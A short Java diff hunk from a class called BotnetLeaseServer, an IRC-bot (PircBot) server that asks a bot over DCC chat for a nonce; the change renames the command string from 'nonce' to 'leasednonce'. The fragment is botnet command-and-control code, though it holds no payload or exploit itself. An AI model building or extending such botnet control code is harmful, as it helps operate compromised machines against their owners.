@@ -244,7 +244,7 @@ public class BotnetLeaseServer extends PircBot {
 	private int getNonce(String bot) {
 		try {
 			DccChat chat = dccSendChatRequest(bot, TIMEOUT);
-			chat.sendLine("nonce");
+			chat.sendLine("leasednonce");
 			int nonce = Integer.parseInt(chat.readLine());
 			chat.close();
 			System.out.println("nonce:" + nonce);
